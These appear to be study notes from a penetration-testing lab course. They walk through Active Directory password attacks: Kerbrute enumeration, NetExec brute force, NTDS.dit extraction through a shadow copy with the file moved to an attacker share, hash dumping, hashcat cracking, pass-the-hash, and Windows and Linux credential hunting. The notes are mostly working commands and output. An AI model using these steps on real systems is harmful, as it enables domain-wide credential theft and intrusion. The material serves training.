Before you start guessing passwords for usernames which might not even exist, it may be worthwile identifying correct naming convention and confirming the validity of some usernames. You can do this with a tool like [Kerbrute](https://github.com/ropnop/kerbrute). Kerbrute can be used for brute-forcing, password spraying and username enumeration.

```bash
d41y@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop

2025/04/25 09:17:10 >  Using KDC(s):
2025/04/25 09:17:10 >   10.129.201.57:88

2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@inlanefreight.local
<SNIP>
```

##### Launching a Brute-Force Attack with NetExec

Once you have your list(s) prepared or discover the naming convention and some employee names, you can launch a brute-force attack against the target DC using a tool such as NetExec. You can use it in conjunction with the SMB protocol to send logon requests to the target DC:

```bash
d41y@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
```

##### Event Logs from the Attack

![password attacks 5](../../images/password_attacks_5.png)

It can be useful to know what might have been left behind by an attack. Knowing this can make your remediation recommendations more impactful and valuable for the client you are working with. On any Windows OS, an admin can navigate to Event Viewer and view the Security events to see the exact actions that were logged. This can inform decisions to implement stricter security controls and assist in any potential investigation that might be involved following a breach.

Once you have discovered some creds, you could proceed to try to gain remote access to the target DC and capture the NTDS.dit file.

#### Capturing NTDS.dit

NT Directory Services (_NTDS_) is the directory service used with AD to find and organize network resources. Recall that NTDS.dit file is stored at ```%systemroot%/ntds``` on the DC in a forest. The ```.dit``` stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, you could potentially compromise every account on the DC.

##### Connecting to a DC with Evil-WinRm

```bash
d41y@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

##### Checking Local Group Membership

```bash
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

You are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, you need local admin (_Administrators Group_) or Domain Admin (_Domain Admins Group_) rights.

##### Checking User Account Privileges including Domain

You will also want to check what domain privileges you have.

```bash
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

This account has both Administrators and Domain Administrator rights which means you can do just about anything you want, including making a copy of the NTDS.dit file.

##### Creating Shadow Copy of C:

You can use vssadmin to create a Volume Shadow Copy (_VSS_) of the ```C:\``` drive or whatever volume the admin chose when initally installing AD. It is very likely that NTDS will be stored on ```C:\``` as that is the default location selected at install, but it is possible to change the location. You use VSS for this because it is designed to make copies of volumes that may be read and written to actively without needing to bring a particular application or system down. VSS is used by many different backup and disaster recovery software to perform operations.

```bash
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

##### Copying NTDS.dit from the VSS

You can copy the NTDS.dit file from the volume shadow copy of ```C:\``` onto another location on the drive to prepare to move NTDS.dit to your attack host.

```bash
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

Before copying NTDS.dit to your attack host, you may want to use the technique to create an SMB share.

##### Transferring NTDS.dit to Attack Host

Now ```cmd.exe /c move``` can be used to move the file from the target DC to the share on your attack host.

```bash
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.	
```

##### Extracting Hashes from NTDS.dit

With a copy of NTDS.dit on your attack host, you can go ahead and dump the hashes. One way to do this is with Impacket's secretdump:

```bash
d41y@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
<SNIP>
```

##### A faster Method: Using NetExec to capture NTDS.dit

Alternatively, you may benefit from using NetExec to accomplish the same steps shown above, all with one command. This command allows you to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within your terminal session.

```bash
d41y@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

SMB         10.129.201.57   445     DC01         [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57   445     DC01         [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
NTDSUTIL    10.129.201.57   445     DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.201.57   445     DC01         [+] NTDS.dit dumped to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [*] NTDS dump copied to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [+] Deleted C:\Windows\Temp\174556000 remote dump directory
NTDSUTIL    10.129.201.57   445     DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.201.57   445     DC01         DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
NTDSUTIL    10.129.201.57   445     DC01         Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
NTDSUTIL    10.129.201.57   445     DC01         Administrator:des-cbc-md5:618c1c5ef780cde3
NTDSUTIL    10.129.201.57   445     DC01         DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
NTDSUTIL    10.129.201.57   445     DC01         DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
NTDSUTIL    10.129.201.57   445     DC01         DC01$:des-cbc-md5:a2852362e50eae92
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:des-cbc-md5:9bd5017fdcea8fae
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
NTDSUTIL    10.129.201.57   445     DC01         [+] Dumped 61 NTDS hashes to /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds of which 15 were added to the database
NTDSUTIL    10.129.201.57   445    DC01          [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.201.57   445    DC01          [*] grep -iv disabled /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds | cut -d ':' -f1
```

#### Cracking Hashes and Gaining Credentials

You can proceed with creating a text file containing all the NT hashes, or you can individually copy and paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.

```bash
d41y@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

#### Pass the Hash (PtH) Considerations

What if you are unsuccessful in cracking the hash?

You can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash. A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. Instead of ```username:clear-text-password``` as the format login, you can instead use ```username:password_hash```.

```bash
d41y@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

### Credential Hunting

... is the process of performing detailed searches across the file system and through various applications to discover credentials.

#### Search-centric

Many of the tools available in Windows have search functionality. In this day and age, there are search-centric features built into most apps and OS, so you can use this to your advantage on an engagement. A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files. It would be wise to base your search for credentials on what you know about the target system is being used.

##### Key Terms to Search for

Some helpful key terms you can use that help you discover some credentials:

- Passwords
- Passphrases
- Keys
- Username
- User account
- Creds
- Users
- Passkeys
- configuration
- dbcredential
- dbpassword
- pwd
- Login
- Credentials

#### Search Tools

##### Windows Search

With access to the GUI, it is worth attempting to use Windows Search to find files on the target using some of the keywords mentioned above.

![password attacks 6](../../images/password_attacks_6.png)

By default, it will search various OS settings and the file system for files and applications containing the key term entered in the search bar.

##### [LaZagne](https://github.com/AlessandroZ/LaZagne)

... is made up of modules which each target different software when looking for passwords.

| Module | Description |
| ------ | ----------- |
| browsers | extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera |
| chats | extracts passwords from various chat apps including Skype |
| mails | searches through mailboxes for passwords including Outlook and Thunderbird |
| memory | dumps passwords from memory, targeting KeePass and LSASS |
| sysadmin | extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP |
| windows | extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more |
| wifi | dumps WiFi credentials |

It would be beneficial to keep a standalone copy of LaZagne on your attack host so you can quickly transfer it over to the target. LaZagne.exe will do just fine for you in this scenario.

Once LaZagne.exe is on the target, you can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute the following command:

```
C:\Users\bob\Desktop> start LaZagne.exe all
```

This will execute LaZagne and run all included modules. You can include the option ```-vv``` to study what it is doing in the background. Once you hit enter, it will open another prompt and display the results.

```
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

If you used the ```-vv``` option, you would see attempts to gather passwords from all LaZagne's supported software.

##### findstr

You can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, you can use variations of this command to discover credentials on a Windows target:

```
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

#### Additional Considerations

There are thousands of tools and key terms you could use to hunt for credentials on Windows OS. Know that which ones you choose to use will be primarily based on the function of the computer. If you land on a Windows Server, you may use a different approach than if you land on a Windows Desktop. Always be mindful of how the system is being used, and this will help you know where to look. Sometimes you may even be able to find credentials by navigating and listing dirs on the file system as your tools run.

Here are some other places you should keep in mind when credential hunting:

- passwords in Group Policy in the SYSVOL share
- passwords in scripts in the SYSVOL share
- passwords in web.config files on dev machines and IT shares
- passwords in unattend.xml
- passwords in the AD user or computer description fields
- KeePass databases
- Found on user systems and shares
- Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint

## Linux Systems

### Authentication Process

Linux-based distributions support various authentication mechanisms. One of the most commonly used is Pluggable Authentication Modules (_PAM_). The modules responsible for this functionality, such as ```pam_unix.so``` or ```pam_unix2.so```, are typically located in ```/usr/lib/x86_64-linux-gnu/security/``` on Debian-based systems. These modules manage user information, authentication, sessions, and password changes. For example, when a user changes their password using the ```passwd``` command, PAM is invoked, which takes the appropriate precautions to handle and store the information accordingly.

The ```pam_unix.so``` module uses standardized API calls from system libraries to update account information. The primary files it reads from and writes to are ```/etc/passwd``` and ```/etc/shadow```. PAM also includes many other services, such as those for LDAP, mount operations, and Kerberos authentication.

#### Passwd File

The ```/etc/passwd``` file contains information about every user on the system and is readable by all users and services. Each entry in the file corresponds to a single user and consists of seven fields, which store user-related data in a structured format. These fields are separated by ```:```.

Example:

```bash
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

| Field | Value |
| ----- | ----- |
| Username | htb-student |
| Password | x |
| User ID | 1000 |
| Group ID | 1000 |
| GECOS | ,,, |
| Home dir | /home/htb-student |
| Default shell | /bin/bash |

The most relevant field for your purposes is the password field, as it can obtain different types of entries. In rare cases this field may hold the actual password hash. On modern systems, however, password hashes are stored in the ```/etc/shadow``` file. Despite this, the ```/etc/passwd``` file is world-readable, giving attackers the ability to crack the passwords if hashes are stored here.

Usually, you will find the value ```x``` in this field, indicating that the passwords are stored in a hashed form within the ```/etc/shadow``` file. However, it can also be that the ```/etc/shadow``` file is writeable by mistake. This would allow you to remove the password field for the root user entirely.

```bash
d41y@htb[/htb]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash
```

This results in no password prompt being displayed when attempting to log in as root.

```bash
d41y@htb[/htb]$ su

root@htb[/htb]#
```

Although the scenarios described are rare, you should still pay attention and watch for potential security gaps, as there are apps that require specific permissions on entire folders. If the administrator has little experience with Linux, they might mistakenly assign write permissions to the ```/etc``` dir and fail to correct them later.

#### Shadow File

Since reading password hash values can put the entire system at risk, the ```/etc/shadow``` file was introduced. It has a similar format to ```/etc/passwd``` but is solely responsible for password storage and management. It contains all password information for created users. For example, if there is no entry in the ```/etc/shadow``` file for a user listed in ```/etc/passwd```, that user is considered invalid. The ```/etc/shadow``` file is also only readable by users with administrative privileges. The format of this file is divided into the following nine fields:

```bash
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```

| Field | Value |
| ----- | ----- |
| Username | htb-student |
| Password | $y$j9T$3QSBB6CbHEu...SNIP...f8Ms |
| Last change | 18955 |
| Min age | 0 |
| Max age | 99999 |
| Warning period | 7 |
| Inactivity period | - |
| Expiration date | - |
| Reserved field | - |

If the password field contains a char such as ```!``` or ```*```, the user cannot log in using a Unix password. However, other authentication methods - such as Kerberos or key-based authenticatino - can still be used. The same applies if the password field is empty, meaning no password is required to login. This can lead to certain programs denying access to specific functions. The password field also follows a particular format, from which you can extract additional information.

```
$<id>$<salt>$<hashed>
```

As you can see here, the hashed passwords are divided into three parts. The ```ID``` value specifies which cryptographic hash algorithm was used, typically one of the following:

| ID | Cryptographic Hash Algorithm |
| -- | ---------------------------- |
| 1 | MD5 |
| 2a | Blowfish |
| 5 | SHA-256 |
| 6 | SHA-512 |
| sha1 | SHA1crypt |
| y | Yescrypt |
| gy | Gost-yescrypt |
| 7 | Scrypt |

Many Linux distributions, including Debian, now use yescrypt as the default hashing algorithm. On older systems, however, you may still encounter other hashing methods that can potentially be cracked.

#### Opasswd

The PAM library (_pam\_unix.so_) can prevent users from reusing old passwords. These previous passwords are stored in the ```/etc/security/opasswd``` file. Administrator privileges are required to read this file, assuming its permissions have not been modified manually.

```bash
d41y@htb[/htb]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

Looking at the contents of this file, you can see that it contains several entries for the user ```cry0l1t3```, separated by a comman. One critical detail to pay attention to is the type of hash that's been used. This is because the MD5 algorithm is significantly easier to crack than SHA-512. This is particularly important when identifying old passwords and recognizing patterns, as users often reuse similar passwords across multiple services or apps. Recognizing these patterns can greatly improve your chances of correctly guessing the password.

#### Cracking Linux Credentials

Once you have root access on a Linux machine, you can gather user password hashes and attempt to crack them using various methods to recover the plaintext passwords. To do this, you can use a tool called [unshadow](https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c), which is included in John. It works by combining the ```passwd``` and ```shadow``` files into a single file suitable for cracking.

```bash
d41y@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
d41y@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
d41y@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

This "unshadowed" file can now be attacked with either John or Hashcat.

```bash
d41y@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

### Credential Hunting

There are several sources that can provide you with credentials that you put in four categories. These include, but are not limited to:

- **Files** including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
- **History** including logs, and command-line history
- **Memory** including cache, and in-memory processing
- **Key-rings** such as browser stored credentials

Enumerating all these categories will allow you to increase the probability of successfully finding out - with some ease - credentials of existing users on the system. There are countless different situations in which you will always see different results. Therefore, you should adapt your approach to the circumstances of the environment and keep the big picture in mind. Above all, it is crucial to keep in mind how the system works, its focus, what purpose it exists for, and what role it plays in the business logic and the overall network. For example, suppose it is an isolated database server, in that case, you will not necessarily find normal users there since it is a sensitive interface in the management of data to which only a few people are granted access.

#### Files

One core principle of Linux is that everything is a file. Therefore, it is crucial to keep this concept in mind and search, find and filter the appropriate files according to your requirements. You should look for, find, and inspect several categories of files one by one. These categories are the following:

- Configs
- Databases
- Notes
- Scripts
- Cronjobs
- SSH keys

Configs are the core of the functionality of services on Linux distributions. Often they even contain credentials that you will be able to read. Their insight also allows you to understand how the service works and its requirements precisely. Usually, the configs are marked with the following three file extensions: ```.config```, ```.conf```, ```.cnf```. However, these configuration files or the associated extentsion files can be renamed, which means that these file extensions are not necessarily required. Furthermore, even when recompiling a service, the required filename for the basic configuration can be changed, which would result in the same effect. However, this is a rare case that you will not encounter often, but this possibility should not be left out of your search.

##### Searching for Config Files

```bash
d41y@htb[/htb]$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
```

Optionally, you can save the results in a text file and it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and out the contents. In this example, you search for three words (_user, password, pass_) in each file with the file extension ```.cnf```.

```bash
d41y@htb[/htb]$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf
```

##### Searching for DBs

```bash
d41y@htb[/htb]$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
/home/cry0l1t3/.cache/tracker/meta.db
/home/cry0l1t3/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.dbus
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db-shm
/home/cry0l1t3/.cache/tracker/meta.db-wal
/home/cry0l1t3/.cache/tracker/meta.db
```

##### Searching for Notes

Depending on the environment you are in and the purpose of the host you are on, you can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as ```.txt```. Therefore, in this case, you need to search for files including the ```.txt``` file extension and files that have no file extension at all.

```bash
d41y@htb[/htb]$ find /home/* -type f -name "*.txt" -o ! -name "*.*"

/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
<SNIP>
```

##### Searching for Scripts

Among other things, scripts can contain credentials that are necessary to be able to call up and execute processes automatically. Otherwise, the administrator or dev would have to enter the corresponding password each time the script or the compiled program is called.

```bash
d41y@htb[/htb]$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

File extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
